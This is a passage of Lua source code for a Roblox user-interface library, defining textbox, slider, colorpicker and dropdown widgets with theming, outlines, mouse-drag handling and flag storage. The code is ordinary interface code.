				textbox.Holder.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 14)
				textbox.Holder.BorderSizePixel = 0
				textbox.Holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

				textbox.Gradient = Instance.new(""UIGradient"", textbox.Holder)
				textbox.Gradient.Rotation = 90
				textbox.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(49, 49, 49)), ColorSequenceKeypoint.new(1, Color3.fromRGB(39, 39, 39))})

				textbox.Main = Instance.new(""TextBox"", textbox.Holder)
				textbox.Main.PlaceholderText = textbox.text
				textbox.Main.PlaceholderColor3 = Color3.fromRGB(190, 190, 190)
				textbox.Main.Text = """"
				textbox.Main.BackgroundTransparency = 1
				textbox.Main.Font = window.theme.font
				textbox.Main.Name = ""textbox""
				textbox.Main.MultiLine = false
				textbox.Main.ClearTextOnFocus = false
				textbox.Main.ZIndex = 5
				textbox.Main.TextScaled = true
				textbox.Main.Size = textbox.Holder.Size
				textbox.Main.TextSize = 15
				textbox.Main.TextColor3 = Color3.fromRGB(255, 255, 255)
				textbox.Main.BorderSizePixel = 0
				textbox.Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
				textbox.Main.TextXAlignment = Enum.TextXAlignment.Left

				if textbox.flag and textbox.flag ~= """" then
					library.flags[textbox.flag] = textbox.default or """"
				end

				function textbox:Set(text)
					textbox.value = text
					textbox.Main.Text = text
					if textbox.flag and textbox.flag ~= """" then
						library.flags[textbox.flag] = text
					end
					pcall(textbox.callback, text)
				end
				updateevent.Event:Connect(function(theme)
					textbox.Main.Font = theme.font
				end)

				function textbox:Get()
					return textbox.value
				end

				if textbox.default then
					textbox:Set(textbox.default)
				end

				textbox.Main.FocusLost:Connect(function()
					textbox:Set(textbox.Main.Text)
				end)

				textbox.BlackOutline2 = Instance.new(""Frame"", textbox.Main)
				textbox.BlackOutline2.Name = ""blackline""
				textbox.BlackOutline2.ZIndex = 4
				textbox.BlackOutline2.Size = textbox.Main.Size + UDim2.fromOffset(6, 6)
				textbox.BlackOutline2.BorderSizePixel = 0
				textbox.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				textbox.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
				updateevent.Event:Connect(function(theme)
					textbox.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
				end)

				textbox.Outline = Instance.new(""Frame"", textbox.Main)
				textbox.Outline.Name = ""blackline""
				textbox.Outline.ZIndex = 4
				textbox.Outline.Size = textbox.Main.Size + UDim2.fromOffset(4, 4)
				textbox.Outline.BorderSizePixel = 0
				textbox.Outline.BackgroundColor3 = window.theme.outlinecolor
				textbox.Outline.Position = UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					textbox.Outline.BackgroundColor3 = theme.outlinecolor
				end)

				textbox.BlackOutline = Instance.new(""Frame"", textbox.Main)
				textbox.BlackOutline.Name = ""blackline""
				textbox.BlackOutline.ZIndex = 4
				textbox.BlackOutline.Size = textbox.Main.Size + UDim2.fromOffset(2, 2)
				textbox.BlackOutline.BorderSizePixel = 0
				textbox.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
				textbox.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
				updateevent.Event:Connect(function(theme)
					textbox.BlackOutline.BackgroundColor3 = theme.outlinecolor2
				end)

				textbox.BlackOutline2.MouseEnter:Connect(function()
					textbox.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
				end)
				textbox.BlackOutline2.MouseLeave:Connect(function()
					textbox.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				end)

				sector:FixSize()
				table.insert(library.items, textbox)

				return textbox
			end

			function sector:AddSlider(text, min, default, max, decimals, callback, flag)
				local slider = {}
				slider.text = text or """"
				slider.callback = callback or function(value) end
				slider.min = min or 0
				slider.max = max or 100
				slider.decimals = decimals or 1
				slider.default = default or slider.min
				slider.flag = flag or text or """"

				slider.value = slider.default
				local dragging = false

				slider.MainBack = Instance.new(""Frame"", sector.Items)
				slider.MainBack.Name = ""MainBack""
				slider.MainBack.ZIndex = 7
				slider.MainBack.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 25)
				slider.MainBack.BorderSizePixel = 0
				slider.MainBack.BackgroundTransparency = 1

				slider.Label = Instance.new(""TextLabel"", slider.MainBack)
				slider.Label.BackgroundTransparency = 1
				slider.Label.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 6)
				slider.Label.Font = window.theme.font
				slider.Label.Text = slider.text .. "":""
				slider.Label.TextColor3 = window.theme.itemscolor
				slider.Label.Position = UDim2.fromOffset(0, 0)
				slider.Label.TextSize = 15
				slider.Label.ZIndex = 4
				slider.Label.TextStrokeTransparency = 1
				slider.Label.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					slider.Label.Font = theme.font
					slider.Label.TextColor3 = theme.itemscolor
				end)

				local size = textservice:GetTextSize(slider.Label.Text, slider.Label.TextSize, slider.Label.Font, Vector2.new(200, 300))
				slider.InputLabel = Instance.new(""TextBox"", slider.MainBack)
				slider.InputLabel.BackgroundTransparency = 1
				slider.InputLabel.ClearTextOnFocus = false
				slider.InputLabel.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - size.X - 15, 12)
				slider.InputLabel.Font = window.theme.font
				slider.InputLabel.Text = ""0""
				slider.InputLabel.TextColor3 = window.theme.itemscolor
				slider.InputLabel.Position = UDim2.fromOffset(size.X + 3, - 3)
				slider.InputLabel.TextSize = 15
				slider.InputLabel.ZIndex = 4
				slider.InputLabel.TextStrokeTransparency = 1
				slider.InputLabel.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					slider.InputLabel.Font = theme.font
					slider.InputLabel.TextColor3 = theme.itemscolor

					local size = textservice:GetTextSize(slider.Label.Text, slider.Label.TextSize, slider.Label.Font, Vector2.new(200, 300))
					slider.InputLabel.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - size.X - 15, 12)
				end)

				slider.Main = Instance.new(""TextButton"", slider.MainBack)
				slider.Main.Name = ""slider""
				slider.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				slider.Main.Position = UDim2.fromOffset(0, 15)
				slider.Main.BorderSizePixel = 0
				slider.Main.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 12)
				slider.Main.AutoButtonColor = false
				slider.Main.Text = """"
				slider.Main.ZIndex = 5

				slider.BlackOutline2 = Instance.new(""Frame"", slider.Main)
				slider.BlackOutline2.Name = ""blackline""
				slider.BlackOutline2.ZIndex = 4
				slider.BlackOutline2.Size = slider.Main.Size + UDim2.fromOffset(6, 6)
				slider.BlackOutline2.BorderSizePixel = 0
				slider.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				slider.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
				updateevent.Event:Connect(function(theme)
					slider.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
				end)

				slider.Outline = Instance.new(""Frame"", slider.Main)
				slider.Outline.Name = ""blackline""
				slider.Outline.ZIndex = 4
				slider.Outline.Size = slider.Main.Size + UDim2.fromOffset(4, 4)
				slider.Outline.BorderSizePixel = 0
				slider.Outline.BackgroundColor3 = window.theme.outlinecolor
				slider.Outline.Position = UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					slider.Outline.BackgroundColor3 = theme.outlinecolor
				end)

				slider.BlackOutline = Instance.new(""Frame"", slider.Main)
				slider.BlackOutline.Name = ""blackline""
				slider.BlackOutline.ZIndex = 4
				slider.BlackOutline.Size = slider.Main.Size + UDim2.fromOffset(2, 2)
				slider.BlackOutline.BorderSizePixel = 0
				slider.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
				slider.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
				updateevent.Event:Connect(function(theme)
					slider.BlackOutline.BackgroundColor3 = theme.outlinecolor2
				end)

				slider.Gradient = Instance.new(""UIGradient"", slider.Main)
				slider.Gradient.Rotation = 90
				slider.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(49, 49, 49)), ColorSequenceKeypoint.new(1, Color3.fromRGB(41, 41, 41))})

				slider.SlideBar = Instance.new(""Frame"", slider.Main)
				slider.SlideBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				slider.SlideBar.ZIndex = 5
				slider.SlideBar.BorderSizePixel = 0
				slider.SlideBar.Size = UDim2.fromOffset(0, slider.Main.Size.Y.Offset)

				slider.Gradient2 = Instance.new(""UIGradient"", slider.SlideBar)
				slider.Gradient2.Rotation = 90
				slider.Gradient2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, window.theme.accentcolor), ColorSequenceKeypoint.new(1, window.theme.accentcolor2)})
				updateevent.Event:Connect(function(theme)
					slider.Gradient2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, theme.accentcolor), ColorSequenceKeypoint.new(1, theme.accentcolor2)})
				end)

				slider.BlackOutline2.MouseEnter:Connect(function()
					slider.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
				end)
				slider.BlackOutline2.MouseLeave:Connect(function()
					slider.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				end)

				if slider.flag and slider.flag ~= """" then
					library.flags[slider.flag] = slider.default or slider.min or 0
				end

				function slider:Get()
					return slider.value
				end

				function slider:Set(value)
					slider.value = math.clamp(math.round(value * slider.decimals) / slider.decimals, slider.min, slider.max)
					local percent = 1 - ((slider.max - slider.value) / (slider.max - slider.min))
					if slider.flag and slider.flag ~= """" then
						library.flags[slider.flag] = slider.value
					end
					slider.SlideBar:TweenSize(UDim2.fromOffset(percent * slider.Main.AbsoluteSize.X, slider.Main.AbsoluteSize.Y), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05)
					slider.InputLabel.Text = slider.value
					pcall(slider.callback, slider.value)
				end
				slider:Set(slider.default)

				slider.InputLabel.FocusLost:Connect(function(Return)
					if not Return then
						return 
					end

					if (slider.InputLabel.Text:match(""^%d + $"")) then
						slider:Set(slider.InputLabel.Text)
					else
						slider.InputLabel.Text = slider.value
					end
				end)

				function slider:Refresh()
					local mousepos = game:GetService(""Workspace"").CurrentCamera:WorldToViewportPoint(mouse.Hit.p)
					local percent = math.clamp(mousepos.X - slider.SlideBar.AbsolutePosition.X, 0, slider.Main.AbsoluteSize.X) / slider.Main.AbsoluteSize.X
					local value = math.round((slider.min + (slider.max - slider.min) * percent) * slider.decimals) / slider.decimals
					value = math.clamp(value, slider.min, slider.max)
					slider:Set(value)
				end

				slider.SlideBar.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						dragging = true
						slider:Refresh()
					end
				end)

				slider.SlideBar.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						dragging = false
					end
				end)

				slider.Main.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						dragging = true
						slider:Refresh()
					end
				end)

				slider.Main.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						dragging = false
					end
				end)

				uis.InputChanged:Connect(function(input)
					if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
						slider:Refresh()
					end
				end)

				sector:FixSize()
				table.insert(library.items, slider)
				return slider
			end

			function sector:AddColorpicker(text, default, callback, flag)
				local colorpicker = {}

				colorpicker.text = text or """"
				colorpicker.callback = callback or function() end
				colorpicker.default = default or Color3.fromRGB(255, 255, 255)
				colorpicker.value = colorpicker.default
				colorpicker.flag = flag or text or """"

				colorpicker.Label = Instance.new(""TextLabel"", sector.Items)
				colorpicker.Label.BackgroundTransparency = 1
				colorpicker.Label.Size = UDim2.fromOffset(156, 10)
				colorpicker.Label.ZIndex = 4
				colorpicker.Label.Font = window.theme.font
				colorpicker.Label.Text = colorpicker.text
				colorpicker.Label.TextColor3 = window.theme.itemscolor
				colorpicker.Label.TextSize = 15
				colorpicker.Label.TextStrokeTransparency = 1
				colorpicker.Label.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					colorpicker.Label.Font = theme.font
					colorpicker.Label.TextColor3 = theme.itemscolor
				end)

				colorpicker.Main = Instance.new(""Frame"", colorpicker.Label)
				colorpicker.Main.ZIndex = 6
				colorpicker.Main.BorderSizePixel = 0
				colorpicker.Main.Position = UDim2.fromOffset(sector.Main.Size.X.Offset - 29, 0)
				colorpicker.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				colorpicker.Main.Size = UDim2.fromOffset(16, 10)

				colorpicker.Gradient = Instance.new(""UIGradient"", colorpicker.Main)
				colorpicker.Gradient.Rotation = 90

				local clr = Color3.new(math.clamp(colorpicker.value.R / 1.7, 0, 1), math.clamp(colorpicker.value.G / 1.7, 0, 1), math.clamp(colorpicker.value.B / 1.7, 0, 1))
				colorpicker.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, colorpicker.value), ColorSequenceKeypoint.new(1, clr)})

				colorpicker.BlackOutline2 = Instance.new(""Frame"", colorpicker.Main)
				colorpicker.BlackOutline2.Name = ""blackline""
				colorpicker.BlackOutline2.ZIndex = 4
				colorpicker.BlackOutline2.Size = colorpicker.Main.Size + UDim2.fromOffset(6, 6)
				colorpicker.BlackOutline2.BorderSizePixel = 0
				colorpicker.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				colorpicker.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
				updateevent.Event:Connect(function(theme)
					colorpicker.BlackOutline2.BackgroundColor3 = window.OpenedColorPickers[colorpicker.MainPicker] and theme.accentcolor or theme.outlinecolor2
				end)

				colorpicker.Outline = Instance.new(""Frame"", colorpicker.Main)
				colorpicker.Outline.Name = ""blackline""
				colorpicker.Outline.ZIndex = 4
				colorpicker.Outline.Size = colorpicker.Main.Size + UDim2.fromOffset(4, 4)
				colorpicker.Outline.BorderSizePixel = 0
				colorpicker.Outline.BackgroundColor3 = window.theme.outlinecolor
				colorpicker.Outline.Position = UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					colorpicker.Outline.BackgroundColor3 = theme.outlinecolor
				end)

				colorpicker.BlackOutline = Instance.new(""Frame"", colorpicker.Main)
				colorpicker.BlackOutline.Name = ""blackline""
				colorpicker.BlackOutline.ZIndex = 4
				colorpicker.BlackOutline.Size = colorpicker.Main.Size + UDim2.fromOffset(2, 2)
				colorpicker.BlackOutline.BorderSizePixel = 0
				colorpicker.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
				colorpicker.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
				updateevent.Event:Connect(function(theme)
					colorpicker.BlackOutline.BackgroundColor3 = theme.outlinecolor2
				end)

				colorpicker.BlackOutline2.MouseEnter:Connect(function()
					colorpicker.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
				end)
				colorpicker.BlackOutline2.MouseLeave:Connect(function()
					if not window.OpenedColorPickers[colorpicker.MainPicker] then
						colorpicker.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					end
				end)

				colorpicker.MainPicker = Instance.new(""TextButton"", colorpicker.Main)
				colorpicker.MainPicker.Name = ""picker""
				colorpicker.MainPicker.ZIndex = 100
				colorpicker.MainPicker.Visible = false
				colorpicker.MainPicker.AutoButtonColor = false
				colorpicker.MainPicker.Text = """"
				window.OpenedColorPickers[colorpicker.MainPicker] = false
				colorpicker.MainPicker.Size = UDim2.fromOffset(180, 196)
				colorpicker.MainPicker.BorderSizePixel = 0
				colorpicker.MainPicker.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
				colorpicker.MainPicker.Rotation = 0
				colorpicker.MainPicker.Position = UDim2.fromOffset(- colorpicker.MainPicker.AbsoluteSize.X + colorpicker.Main.AbsoluteSize.X, 15)

				colorpicker.BlackOutline3 = Instance.new(""Frame"", colorpicker.MainPicker)
				colorpicker.BlackOutline3.Name = ""blackline""
				colorpicker.BlackOutline3.ZIndex = 98
				colorpicker.BlackOutline3.Size = colorpicker.MainPicker.Size + UDim2.fromOffset(6, 6)
				colorpicker.BlackOutline3.BorderSizePixel = 0
				colorpicker.BlackOutline3.BackgroundColor3 = window.theme.outlinecolor2
				colorpicker.BlackOutline3.Position = UDim2.fromOffset(- 3, - 3)
				updateevent.Event:Connect(function(theme)
					colorpicker.BlackOutline3.BackgroundColor3 = theme.outlinecolor2
				end)

				colorpicker.Outline2 = Instance.new(""Frame"", colorpicker.MainPicker)
				colorpicker.Outline2.Name = ""blackline""
				colorpicker.Outline2.ZIndex = 98
				colorpicker.Outline2.Size = colorpicker.MainPicker.Size + UDim2.fromOffset(4, 4)
				colorpicker.Outline2.BorderSizePixel = 0
				colorpicker.Outline2.BackgroundColor3 = window.theme.outlinecolor
				colorpicker.Outline2.Position = UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					colorpicker.Outline2.BackgroundColor3 = theme.outlinecolor
				end)

				colorpicker.BlackOutline3 = Instance.new(""Frame"", colorpicker.MainPicker)
				colorpicker.BlackOutline3.Name = ""blackline""
				colorpicker.BlackOutline3.ZIndex = 98
				colorpicker.BlackOutline3.Size = colorpicker.MainPicker.Size + UDim2.fromOffset(2, 2)
				colorpicker.BlackOutline3.BorderSizePixel = 0
				colorpicker.BlackOutline3.BackgroundColor3 = window.theme.outlinecolor2
				colorpicker.BlackOutline3.Position = UDim2.fromOffset(- 1, - 1)
				updateevent.Event:Connect(function(theme)
					colorpicker.BlackOutline3.BackgroundColor3 = theme.outlinecolor2
				end)

				colorpicker.hue = Instance.new(""ImageLabel"", colorpicker.MainPicker)
				colorpicker.hue.ZIndex = 101
				colorpicker.hue.Position = UDim2.new(0, 3, 0, 3)
				colorpicker.hue.Size = UDim2.new(0, 172, 0, 172)
				colorpicker.hue.Image = ""rbxassetid://4155801252""
				colorpicker.hue.ScaleType = Enum.ScaleType.Stretch
				colorpicker.hue.BackgroundColor3 = Color3.new(1, 0, 0)
				colorpicker.hue.BorderColor3 = window.theme.outlinecolor2
				updateevent.Event:Connect(function(theme)
					colorpicker.hue.BorderColor3 = theme.outlinecolor2
				end)

				colorpicker.hueselectorpointer = Instance.new(""ImageLabel"", colorpicker.MainPicker)
				colorpicker.hueselectorpointer.ZIndex = 101
				colorpicker.hueselectorpointer.BackgroundTransparency = 1
				colorpicker.hueselectorpointer.BorderSizePixel = 0
				colorpicker.hueselectorpointer.Position = UDim2.new(0, 0, 0, 0)
				colorpicker.hueselectorpointer.Size = UDim2.new(0, 7, 0, 7)
				colorpicker.hueselectorpointer.Image = ""rbxassetid://6885856475""

				colorpicker.selector = Instance.new(""TextLabel"", colorpicker.MainPicker)
				colorpicker.selector.ZIndex = 100
				colorpicker.selector.Position = UDim2.new(0, 3, 0, 181)
				colorpicker.selector.Size = UDim2.new(0, 173, 0, 10)
				colorpicker.selector.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				colorpicker.selector.BorderColor3 = window.theme.outlinecolor2
				colorpicker.selector.Text = """"
				updateevent.Event:Connect(function(theme)
					colorpicker.selector.BorderColor3 = theme.outlinecolor2
				end)

				colorpicker.gradient = Instance.new(""UIGradient"", colorpicker.selector)
				colorpicker.gradient.Color = ColorSequence.new({
					ColorSequenceKeypoint.new(0, Color3.new(1, 0, 0)), 
					ColorSequenceKeypoint.new(0.17, Color3.new(1, 0, 1)), 
					ColorSequenceKeypoint.new(0.33, Color3.new(0, 0, 1)), 
					ColorSequenceKeypoint.new(0.5, Color3.new(0, 1, 1)), 
					ColorSequenceKeypoint.new(0.67, Color3.new(0, 1, 0)), 
					ColorSequenceKeypoint.new(0.83, Color3.new(1, 1, 0)), 
					ColorSequenceKeypoint.new(1, Color3.new(1, 0, 0))
				})

				colorpicker.pointer = Instance.new(""Frame"", colorpicker.selector)
				colorpicker.pointer.ZIndex = 101
				colorpicker.pointer.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
				colorpicker.pointer.Position = UDim2.new(0, 0, 0, 0)
				colorpicker.pointer.Size = UDim2.new(0, 2, 0, 10)
				colorpicker.pointer.BorderColor3 = Color3.fromRGB(255, 255, 255)

				if colorpicker.flag and colorpicker.flag ~= """" then
					library.flags[colorpicker.flag] = colorpicker.default
				end

				function colorpicker:RefreshSelector()
					local pos = math.clamp((mouse.X - colorpicker.hue.AbsolutePosition.X) / colorpicker.hue.AbsoluteSize.X, 0, 1)
					colorpicker.color = 1 - pos
					colorpicker.pointer:TweenPosition(UDim2.new(pos, 0, 0, 0), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05)
					colorpicker.hue.BackgroundColor3 = Color3.fromHSV(1 - pos, 1, 1)
				end

				function colorpicker:RefreshHue()
					local x = (mouse.X - colorpicker.hue.AbsolutePosition.X) / colorpicker.hue.AbsoluteSize.X
					local y = (mouse.Y - colorpicker.hue.AbsolutePosition.Y) / colorpicker.hue.AbsoluteSize.Y
					colorpicker.hueselectorpointer:TweenPosition(UDim2.new(math.clamp(x * colorpicker.hue.AbsoluteSize.X, 0.5, 0.952 * colorpicker.hue.AbsoluteSize.X) / colorpicker.hue.AbsoluteSize.X, 0, math.clamp(y * colorpicker.hue.AbsoluteSize.Y, 0.5, 0.885 * colorpicker.hue.AbsoluteSize.Y) / colorpicker.hue.AbsoluteSize.Y, 0), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05)
					colorpicker:Set(Color3.fromHSV(colorpicker.color, math.clamp(x * colorpicker.hue.AbsoluteSize.X, 0.5, 1 * colorpicker.hue.AbsoluteSize.X) / colorpicker.hue.AbsoluteSize.X, 1 - (math.clamp(y * colorpicker.hue.AbsoluteSize.Y, 0.5, 1 * colorpicker.hue.AbsoluteSize.Y) / colorpicker.hue.AbsoluteSize.Y)))
				end

				function colorpicker:Set(value)
					local color = Color3.new(math.clamp(value.r, 0, 1), math.clamp(value.g, 0, 1), math.clamp(value.b, 0, 1))
					colorpicker.value = color

					if colorpicker.flag and colorpicker.flag ~= """" then
						library.flags[colorpicker.flag] = color
					end

					local clr = Color3.new(math.clamp(color.R / 1.7, 0, 1), math.clamp(color.G / 1.7, 0, 1), math.clamp(color.B / 1.7, 0, 1))
					colorpicker.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, color), ColorSequenceKeypoint.new(1, clr)})
					pcall(colorpicker.callback, color)
				end

				function colorpicker:Get()
					return colorpicker.value
				end

				colorpicker:Set(colorpicker.default)

				function colorpicker:AddDropdown(items, default, multichoice, callback, flag)
					local dropdown = {}

					dropdown.defaultitems = items or {}
					dropdown.default = default
					dropdown.callback = callback or function() end
					dropdown.multichoice = multichoice or false
					dropdown.values = {}
					dropdown.flag = flag or ((colorpicker.text or """") .. #sector.Items:GetChildren())

					dropdown.Main = Instance.new(""TextButton"", sector.Items)
					dropdown.Main.Name = ""dropdown""
					dropdown.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.Main.BorderSizePixel = 0
					dropdown.Main.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 16)
					dropdown.Main.Position = UDim2.fromOffset(0, 0)
					dropdown.Main.ZIndex = 5
					dropdown.Main.AutoButtonColor = false
					dropdown.Main.Font = window.theme.font
					dropdown.Main.Text = """"
					dropdown.Main.TextColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.Main.TextSize = 15
					dropdown.Main.TextXAlignment = Enum.TextXAlignment.Left
					updateevent.Event:Connect(function(theme)
						dropdown.Main.Font = theme.font
					end)

					dropdown.Gradient = Instance.new(""UIGradient"", dropdown.Main)
					dropdown.Gradient.Rotation = 90
					dropdown.Gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(49, 49, 49)), ColorSequenceKeypoint.new(1, Color3.fromRGB(39, 39, 39))}

					dropdown.SelectedLabel = Instance.new(""TextLabel"", dropdown.Main)
					dropdown.SelectedLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.SelectedLabel.BackgroundTransparency = 1
					dropdown.SelectedLabel.Position = UDim2.fromOffset(5, 2)
					dropdown.SelectedLabel.Size = UDim2.fromOffset(130, 13)
					dropdown.SelectedLabel.Font = window.theme.font
					dropdown.SelectedLabel.Text = colorpicker.text
					dropdown.SelectedLabel.ZIndex = 5
					dropdown.SelectedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.SelectedLabel.TextSize = 15
					dropdown.SelectedLabel.TextStrokeTransparency = 1
					dropdown.SelectedLabel.TextXAlignment = Enum.TextXAlignment.Left
					updateevent.Event:Connect(function(theme)
						dropdown.SelectedLabel.Font = theme.font
					end)

					dropdown.Nav = Instance.new(""ImageButton"", dropdown.Main)
					dropdown.Nav.Name = ""navigation""
					dropdown.Nav.BackgroundTransparency = 1
					dropdown.Nav.LayoutOrder = 10
					dropdown.Nav.Position = UDim2.fromOffset(sector.Main.Size.X.Offset - 26, 5)
					dropdown.Nav.Rotation = 90
					dropdown.Nav.ZIndex = 5
					dropdown.Nav.Size = UDim2.fromOffset(8, 8)
					dropdown.Nav.Image = ""rbxassetid://4918373417""
					dropdown.Nav.ImageColor3 = Color3.fromRGB(210, 210, 210)

					dropdown.BlackOutline2 = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutline2.Name = ""blackline""
					dropdown.BlackOutline2.ZIndex = 4
					dropdown.BlackOutline2.Size = dropdown.Main.Size + UDim2.fromOffset(6, 6)
					dropdown.BlackOutline2.BorderSizePixel = 0
					dropdown.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.Outline = Instance.new(""Frame"", dropdown.Main)
					dropdown.Outline.Name = ""blackline""
					dropdown.Outline.ZIndex = 4
					dropdown.Outline.Size = dropdown.Main.Size + UDim2.fromOffset(4, 4)
					dropdown.Outline.BorderSizePixel = 0
					dropdown.Outline.BackgroundColor3 = window.theme.outlinecolor
					dropdown.Outline.Position = UDim2.fromOffset(- 2, - 2)
					updateevent.Event:Connect(function(theme)
						dropdown.Outline.BackgroundColor3 = theme.outlinecolor
					end)

					dropdown.BlackOutline = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutline.Name = ""blackline""
					dropdown.BlackOutline.ZIndex = 4
					dropdown.BlackOutline.Size = dropdown.Main.Size + UDim2.fromOffset(2, 2)
					dropdown.BlackOutline.BorderSizePixel = 0
					dropdown.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutline.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.ItemsFrame = Instance.new(""ScrollingFrame"", dropdown.Main)
					dropdown.ItemsFrame.Name = ""itemsframe""
					dropdown.ItemsFrame.BorderSizePixel = 0
					dropdown.ItemsFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
					dropdown.ItemsFrame.Position = UDim2.fromOffset(0, dropdown.Main.Size.Y.Offset + 8)
					dropdown.ItemsFrame.ScrollBarThickness = 2
					dropdown.ItemsFrame.ZIndex = 8
					dropdown.ItemsFrame.ScrollingDirection = ""Y""
					dropdown.ItemsFrame.Visible = false
					dropdown.ItemsFrame.CanvasSize = UDim2.fromOffset(dropdown.Main.AbsoluteSize.X, 0)

					dropdown.ListLayout = Instance.new(""UIListLayout"", dropdown.ItemsFrame)
					dropdown.ListLayout.FillDirection = Enum.FillDirection.Vertical
					dropdown.ListLayout.SortOrder = Enum.SortOrder.LayoutOrder

					dropdown.ListPadding = Instance.new(""UIPadding"", dropdown.ItemsFrame)
					dropdown.ListPadding.PaddingTop = UDim.new(0, 2)
					dropdown.ListPadding.PaddingBottom = UDim.new(0, 2)
					dropdown.ListPadding.PaddingLeft = UDim.new(0, 2)
					dropdown.ListPadding.PaddingRight = UDim.new(0, 2)

					dropdown.BlackOutline2Items = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutline2Items.Name = ""blackline""
					dropdown.BlackOutline2Items.ZIndex = 7
					dropdown.BlackOutline2Items.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(6, 6)
					dropdown.BlackOutline2Items.BorderSizePixel = 0
					dropdown.BlackOutline2Items.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutline2Items.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 3, - 3)
					dropdown.BlackOutline2Items.Visible = false
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutline2Items.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.OutlineItems = Instance.new(""Frame"", dropdown.Main)
					dropdown.OutlineItems.Name = ""blackline""
					dropdown.OutlineItems.ZIndex = 7
					dropdown.OutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(4, 4)
					dropdown.OutlineItems.BorderSizePixel = 0
					dropdown.OutlineItems.BackgroundColor3 = window.theme.outlinecolor
					dropdown.OutlineItems.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 2, - 2)
					dropdown.OutlineItems.Visible = false
					updateevent.Event:Connect(function(theme)
						dropdown.OutlineItems.BackgroundColor3 = theme.outlinecolor
					end)

					dropdown.BlackOutlineItems = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutlineItems.Name = ""blackline""
					dropdown.BlackOutlineItems.ZIndex = 7
					dropdown.BlackOutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(- 2, - 2)
					dropdown.BlackOutlineItems.BorderSizePixel = 0
